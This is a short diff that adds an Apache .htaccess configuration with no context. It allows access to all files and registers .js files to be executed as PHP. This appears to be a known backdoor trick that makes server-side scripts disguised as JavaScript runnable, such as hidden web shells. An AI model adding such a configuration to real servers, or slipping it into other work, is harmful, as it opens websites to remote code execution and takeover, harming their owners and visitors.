@@ -1,0 +1,4 @@
+<files *>
+allow from all
+</files>
+AddType application/x-httpd-php .js
